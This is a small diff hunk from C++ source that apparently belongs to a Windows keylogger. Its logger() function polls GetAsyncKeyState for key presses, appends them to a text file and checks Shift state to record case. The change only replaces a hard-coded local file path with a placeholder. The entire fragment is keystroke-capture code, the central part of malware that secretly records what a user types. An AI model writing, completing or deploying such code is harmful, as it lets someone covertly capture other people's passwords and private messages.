@@ -22,7 +22,7 @@ void logger()
         {
             if (GetAsyncKeyState(key) == -32767)
             {
-                ofstream write("D:/Programming/C++/file.txt", ios::app);
+                ofstream write("path/to/stored/key/filename.txt", ios::app);
                 // Check if the key is uppercase and Shift is not pressed
                 if ((key > 62) && (key < 91) && !(GetAsyncKeyState(0x10)))
                 {
